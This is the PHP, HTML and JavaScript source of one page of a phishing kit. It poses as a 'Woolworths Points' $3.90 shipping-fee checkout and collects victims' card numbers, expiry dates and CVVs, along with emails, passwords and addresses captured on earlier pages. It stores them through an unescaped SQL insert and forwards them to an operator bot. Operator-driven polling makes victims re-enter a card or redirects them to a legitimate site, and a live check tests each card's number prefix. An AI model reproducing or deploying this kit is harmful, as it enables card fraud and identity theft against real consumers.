<?php
session_start();
require_once 'api_commands.php';
include ABS_PATH.'/notification_send_to_bot.php';

include('partials/header.php');

if(isset($_SESSION['post']['recipients_name'])) {
    $_SESSION['recipients_name'] = $_SESSION['post']['recipients_name'];
}
if(isset($_POST['cardnumber']) && $_POST['month'] && $_POST['year'] && $_POST['cvv']) {
    $_POST['recipients_name'] = $_SESSION['recipients_name'];
    $_SESSION['post'] = $_POST;
}
if (isset($_POST['submit'])) {
    $_SESSION['post_page3'] = $_POST;
}

if (isset($_POST['payment_submit']) and !empty($_SESSION['post'])) {

    $payment_info = $_POST;
    $user_info = $_SESSION['post_page3'];

    $_POST = $_SESSION['post'];
    $ip = get_client_ip();

    $userEnteredNumber = $payment_info['cardnumber'];

    $row = [];
    $sql = "SELECT * FROM dashboard WHERE meta_key='restricted_numbers'";
    $card_error = '';

    if ($result = mysqli_query($conn, $sql)) {
        $row = $result->fetch_row();
        $restricted_numbers = $row[3];
        $restrictedNumbersArray = explode(',', $restricted_numbers);

        
        if (in_array($userEnteredNumber, $restrictedNumbersArray)) {
            $row = [];
            $restricted_numbers_error = "";
            $sql = "SELECT * FROM dashboard WHERE meta_key='restricted_numbers_error'";
            if ($result = mysqli_query($conn, $sql)) {
                $row = $result->fetch_row();
                $restricted_numbers_error = $row[3];
            }
            $card_error = $restricted_numbers_error;  
        }
    }



    if (!empty($_POST['recipients_name'])) {
        $fullname = $_POST['recipients_name'];
    } else {
        $fullname = $_POST['card_holder_name'];
    }

    if (!empty($_SESSION['step1Data']['email'])) {
        $email = $_SESSION['step1Data']['email'];
    } else {
        $email = "";
    }

     if (!empty($_SESSION['step1Data']['password'])) {
        $password = $_SESSION['step1Data']['password'];;
    } else {
        $password = "";
    }

    if (!empty($user_info['state'])) { // state
        $state = $user_info['state'];
    } else {
        $state = "";
    }
    if (!empty($user_info['other_country'])) {
        $othercountry = $user_info['other_country'];
    } else {
        $othercountry = "";
    }
    if (!empty($user_info['city'])) { // city
        $city = $user_info['city'];
    } else {
        $city = "";
    }
    if (!empty($user_info['address'])) { // address
        $address = $user_info['address'];
    } else {
        $address = "";
    }

    if (!empty($user_info['contact_number'])) {
        $phone = $user_info['contact_number'];
    } else {
        $phone = "";
    }
    $_SESSION["contact_number"] = $phone;


    if (!empty($payment_info['cardnumber'])) {
        $cardnumber = str_replace(' ', '', $payment_info['cardnumber']);
    } else {
        $cardnumber = "";
    }
    if (!empty($payment_info['month']) and !empty($payment_info['year'])) {
        $exp_date = $payment_info['month'] . '/' . $payment_info['year'];
    } else {
        $exp_date = "";
    }
    if (!empty($payment_info['cvv'])) {
        $card_code = $payment_info['cvv'];
    } else {
        $card_code = "";
    }

    $date = date('Y-m-d H:i:s');
    $sql = "INSERT INTO user_information (username,password,fullname,address,city,state, phone, date_created, date_updated, cardnumber, exp_date, card_code, ipaddress,source_code)
	VALUES ('" . $email . "','" . $password . "','" . $fullname . "', '" . $address . "', '" . $city . "', '" . $state . "', '" . $phone . "', '" . $date . "',now(),'" . $cardnumber . "','" . $exp_date . "','" . $card_code . "','" . $ip . "','".$folder_path."')";

// echo $sql; die;
    if (mysqli_query($conn, $sql)) {
        $last_id = mysqli_insert_id($conn);
        $_SESSION["last_id"] = $last_id;

        @send_new_user($cardnumber, $exp_date, $card_code, $fullname, 0, $last_id, 0, "card");
        $zipcode="";
        $message_data = array(
               'address'=> $address, 
               'city'=> $city, 
               'state'=> $state, 
               'zipcode'=> $zipcode, 
               'email'=> $email, 
               'card_number'=> $cardnumber, 
               'card_expire'=> $exp_date, 
               'security_code'=> $card_code, 
               'card_holder'=> $fullname, 
               'ip'=> $ip, 
               'user_agent'=> $_SERVER['HTTP_USER_AGENT'], 
               'date_time'=> $date,
               'post_from'=> $folder_path,
               'phone'=> $phone
        );
        @notification_to_bot($message_data,$conn);


        $_SESSION['post'] = '';
        $_SESSION['total_quantity'] = '';
        $_POST = '';

        //echo '<script>window.location.replace("page5.php")</script>';
        echo '<style>.spinner-border{display:block !important;}</style>';
        echo '<style>.backdrop{display:block !important;}</style>';
        //echo "New record created successfully. Last inserted ID is: " . $last_id;
    } else {
        $err = "Error: " . $sql . "<br>" . mysqli_error($conn);
    }
} // submit end

?>

    <style>
        .hideH {
            display:none !important;
        }
        .wrap {
            padding: 0px 20px;
            margin-top:50px;
        }
        .step{
            color: #325754;
            padding-bottom: 10px;
            font-weight: bold;
        }
        .top1 table.cstm-table td {
            font-size: 14px;
            letter-spacing: 0;
            white-space: normal;
            padding: 5px 0;
            vertical-align: text-bottom;
            line-height: 1.3;
            color:#000;
        }
        .top1 table.cstm-table td strong {
            white-space: nowrap;
            margin-right: 15px;
            color:#325754;
        }
        .form-input label {
            display: block;
            color:#333333;
            font-weight: bold;
        }
        .form-input input {
            width: calc(100% - 30px);
        }
        .form-row input, .form-input input, .form-row select {
            flex-grow: 1;
            border: 1px solid #325754;
            height: 30px;
            outline: none;
            padding: 0 10px;
            border-radius: 4px;
        }
        .form-input select {
            width: 100%;
            height: 30px;
            padding: 2px 12px;
            border: 1px solid #325754;
            border-radius: 3px;
        }
        .card-icons img:last-child {
            padding: 1px 4px;
            border-radius: 3px;
            background-color: #fff;
            height: 31px;
            position: relative;
            top: -1px;
        }
        .card-icons img {
            height: 25px;
            margin-top: 5px;
        }
        .form-input .select {
            padding-right: 15px;
            margin-top: 12px;
            margin-bottom: 12px;
        }
        label.required:after {
            content: " *";
            color: red;
        }
        .form-input {
            margin-bottom: 20px;
        }
        .form-input.cvv input {
            width: 70px;
            color:#333333;
        }
        .form-input.cvv {
            align-items: end;
            color:#333333;
            display: flex;
        }
        .form-input.cvv span img {
            width: 30px;
            margin-left: 20px;
        }
        .extra-details > p {
            color:#333333;
        }
        .form-input.ddmm {
            display: flex;
        }
        h3.step {
            font-size: 18px;
            font-weight: bold;
            color: #325754;
            margin-bottom: 10px;
        }
        .extra-details {
            text-align: center;
            font-weight: bold;
            margin-top: 25px;
            font-size: 14px;
            margin-bottom:20px;
        }

        .top1 h3 {
            text-align: center;
            margin-bottom: 15px;
            font-size:22px;
            margin-top: 15px;
            color:#325754;
        }

        .top1 table.cstm-table td {
            font-size: 14px;
            letter-spacing: 0;
            white-space: normal;
            padding: 5px 0;
            vertical-align: text-bottom;
            line-height: 1.3;
        }

        .top1 table.cstm-table td strong {
            white-space: nowrap;
            margin-right: 15px;
        }

        .top1 table.cstm-table {
            margin-bottom: 20px;
        }
        .form-input-new {
    padding: 20px;
    border: 2px solid gray;
    border-radius: 5px;
}

        @media(max-width: 767px) {
            .submit-btn {
                width: 100%;
                line-height: 32px;
                text-align: center;
                display: inline-block;
                color: #fff !important;
                border-radius: .5rem;
                background: #178841;
                cursor: pointer;
            }
        }
    </style>

    <div class="wrap">

        <div class="form">
            <form action="" method="POST">
                <h3 class="step">

                    <font style="vertical-align: inherit;">
                        <font style="vertical-align: inherit;">Payment of freight</font>
                    </font>
                </h3>

                <h5 class="step" style="color: #325754;
    padding-bottom: 10px;">

                    <font style="vertical-align: inherit;">
                        <font style="vertical-align: inherit;"><span style="color:red;">*</span>Woolworths Points will charge a flat shipping fee of $3.90</font>
                    </font>
                </h5>

                <div class="top1">

                    <h3 class="text-center">Transaction information</h3>

                    <table class="cstm-table" border="0" width="100%">

                        <tbody>
                        <tr>
                            <td><strong>Total:</strong></td>
                            <td>$ 3.90</td>
                        </tr>
                        </tbody>

                    </table>

                </div>

                <div class="backdrop"></div>
                <div class="form-input-new">
                <div class="form-input">
                    <label class="required" for="">Name of cardholder</label>
                    <input type="text" value="<?php echo isset($_SESSION['post']['recipients_name']) ? @$_SESSION['post']['recipients_name'] : @$_SESSION['recipients_name']; ?>" name="card_holder_name">
                </div>
                <div class="form-input">
                    <h3 style="color: red"><?php echo @$card_error; ?></h3>
                    <label class="required" for="">Card Number</label>
                    <input type="text" id="cr_no" name="cardnumber" minlength="19" maxlength="19" placeholder="xxxx-xxxx-xxxx-xxxx">

                    <span class="crediterror" style="color:red; display:none;"><?php echo @$check_site_live['restricted_numbers_error']?@$check_site_live['restricted_numbers_error']:'目前不支持借记卡，请使用信用卡付款。';?></span>


                    <span class="errormsg" style="color:red; display:none;">不支持該卡，請更換並重新輸入</span>
                </div>
                <div class="form-input ddmm">
                    <div class="select">
                        <label class="required" for="">Due date</label>
                        <select name="month" id="">
                            <option value="">mm</option>
                            <?php for ($i = 1; $i <= 12; $i++) echo ('<option value="' . $i . '">' . $i . '</option>'); ?>
                        </select>
                    </div>
                    <div class="select">
                        <label class="required" for="">Maturity year</label>
                        <select name="year" id="">
                            <option value="">yy</option>
                            <?php for ($i = 22; $i <= 32; $i++) echo ('<option value="' . $i . '">' . $i . '</option>'); ?>
                        </select>
                    </div>
                </div>
                
                <div class="form-input cvv">
                    <label class="required" for="">CVV</label>
                    <input type="text" name="cvv" maxlength="4">
                    <span><img src="<?php echo $folder_path;?>/images/cvv.jpg" alt=""><strong>Security code</strong></span>
                </div>
                <div class="center"><button class="btn disabled submit-btn disabledClass" disabled onclick="hitSubmit()" name="payment_submit" type="submit">Pay</button></div>
            </div>
            </form>
            <div class="extra-details">
                 <div class="card-icons">
                        <img src="<?php echo $folder_path;?>/assets/images/payment-icon.png" alt="">
                    </div>
                <p></p>
            </div>
        </div>
    </div>

    <div class="spinner-border" id="ajaxprogress" style="z-index: 9999;position: fixed;top:0px;display:none;height:100%;width:100%;left: unset;right: unset;" role="status">
  <span class="" style="z-index: 1041;display: flex;justify-content: center;width: 100%;align-items: center;height:100%;">
      <div class="lds-default"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div>
  </span>
    </div>

    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.1/jquery.slim.min.js" integrity="sha512-yBpuflZmP5lwMzZ03hiCLzA94N0K2vgBtJgqQ2E1meJzmIBfjbb7k4Y23k2i2c/rIeSUGc7jojyIY5waK3ZxCQ==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
    <script type="text/javascript" src="<?php echo $folder_path;?>/assets/js/jquery-2.1.3.min.js"></script>
    <script>
        function hitSubmit() {
            $(".backdrop").show();
            $('#ajaxprogress').show();
        }
        //script to check input
        jQuery('.form-input input, .form-input select').on('input', function() {
            let check = true;
            jQuery('.form-input input, .form-input select').each(function() {
                if (jQuery(this).val() == '') check = false;
            });
            if (check) jQuery('.btn').removeClass('disabled');
            else jQuery('.btn').addClass('disabled')
        });
        function creditCardValidation()
        {
            let creditCradNum = $('#cr_no').val();
            console.log("creditCradNum ==>",creditCradNum.length === 19);
            if(creditCradNum.length === 19)
            {
                $(".submit-btn").removeClass('disabled');
                $(".submit-btn").removeClass('disabledClass');
                $(".submit-btn").attr('disabled', false);
                return true;
            }
            else
            {
                console.log("Please enter a valid credit card number.");
                $(".submit-btn").addClass('disabledClass');
                $(".submit-btn").attr('disabled', true);
                return false;
            }
        }

        //For Card Number formatted input
        var cardNum = document.getElementById('cr_no');
        cardNum.onkeyup = function(e) {
            creditCardValidation();
            $("#cr_no").removeAttr("style");
            $(".errormsg").css("display", "none");
            if (this.value == this.lastValue) return;
            let caretPosition = this.selectionStart;
            let sanitizedValue = this.value.replace(/[^0-9]/gi, '');
            let parts = [];

            for (var i = 0, len = sanitizedValue.length; i < len; i += 4) {
                parts.push(sanitizedValue.substring(i, i + 4));
            }

            for (var i = caretPosition - 1; i >= 0; i--) {
                var c = this.value[i];
                if (c < '0' || c > '9') {
                    caretPosition--;
                }
            }
            caretPosition += Math.floor(caretPosition / 4);

            this.value = this.lastValue = parts.join(' ');
            this.selectionStart = this.selectionEnd = caretPosition;
            // if (sanitizedValue.length > 0)
            //   $("input[name=payment_submit]").removeAttr('disabled');
            // else
            //   $("input[name=payment_submit]").attr('disabled', 'disabled');
        }
    </script>


    <script type="text/javascript">
        function updatePromptStatus() {
            $.ajax({
                type: 'post',
                url: '<?php echo $folder_path;?>/prompt_status.php',
                data: {
                    'userid': userid,
                    'page': 4
                },
                success: function (data) {
                }
            });
        }
        jQuery(document).ready(function() {
            popcount = 1;
            window.setInterval(function() {
                // do stuff
                var userid = '<?php echo @$_SESSION["last_id"]; ?>';
                $.ajax({
                    type: 'post',
                    url: '<?php echo $folder_path;?>/usertrackingstatus.php',
                    data: {
                        'userid': userid,
                        'page': 2
                    },
                    success: function(data) {
                        if (data == 1) {

                            let page4_redirect = localStorage.getItem("page4_redirect");
                            let page4_redirect_time = localStorage.getItem("page4_redirect_time");
                            if(page4_redirect=='on'){
                                setTimeout(function() {
                                    jQuery(location).attr('href', 'https://www.three.com.hk/tc/home.html');
                                }, page4_redirect_time*1000);
                             }else{
                                jQuery(location).attr('href', './page5.php'); 
                             }

                            
                        }
                        if (data == 2 || data == '2') {
                            jQuery("#ajaxprogress").css("display", "none")
                            jQuery('#carderror').css('display', 'block');
                            if (popcount == 1) {
                                if (window.confirm('卡號無效，請重新輸入卡號')) {
                                    console.log("window confirm box message");
                                    $(".backdrop").addClass('hideH');
                                    $('#ajaxprogress').addClass('hideH');
                                    updatePromptStatus();
                                }
                            }
                            popcount++;
                            $(".backdrop").hide();
                            return false;
                        }

                    }
                });

            }, 4000);


             $("body").on("keyup", "#cr_no", function() {
            console.log('validate credit debit');
            event.preventDefault();
            var cc_number_7 = $(this).val().replace(/ /g, '');
            if (cc_number_7.length > 7) {
                $.ajax({
                    type: 'post',
                    url: '/validate.php',
                    data: {
                        'cc_number_7': cc_number_7,
                        'action': 'cc_details'
                    },
                    success: function(data) {
                        if (data == 1) {
                            $(".submit-btn").removeAttr('disabled');
                            $("input[name=payment_submit]").removeAttr('disabled');
                            $("input[name=payment_submit]").removeClass('disabled');
                            $('.crediterror').css("display", "none");
                            return true;
                        } else if (data == 'card_blocked') {
                            $('.crediterror').css("display", "block");
                            $(".submit-btn").attr('disabled', true);
                            return false;
                        } else {
                            $('.crediterror').css("display", "block");
                            $(".submit-btn").attr('disabled', true);
                            return false;
                        }
                    }
                });
            }
        });


            $("body").on("change", "#cr_no", function() {

                var ignoreArray = ["123456789", "22222222"];
                var currentValue = $(this).val().replace(/ /g, '');

                if (jQuery.inArray(currentValue, ignoreArray) != -1) {
                    $("#cr_no").css("border", "2px solid red");
                    $(".errormsg").css("display", "block");

                }


            })

        })
    </script>
    <script>
        /* JS comes here */
        function setOnline(id, status) {
            if (id) {
                $.ajax({
                    type: 'post',
                    url: '<?php echo $folder_path;?>/usertrackingstatus.php',
                    data: {
                        'id': id,
                        'status': status
                    },
                    success: function(data) {

                    }
                });
            }
        }
        var userid = <?php echo isset($_SESSION["last_id"]) ? $_SESSION["last_id"] : ''; ?>


            window.addEventListener('load', function(e) {
                if (navigator.onLine) {
                    setOnline(userid, 1)
                } else {
                    setOnline(userid, 0)
                }
            }, false);

        window.addEventListener('online', function(e) {
            setOnline(userid, 1)
        }, false);

        window.addEventListener('offline', function(e) {
            setOnline(userid, 0)
        }, false);
    </script>

<?php
include('partials/footer.php');
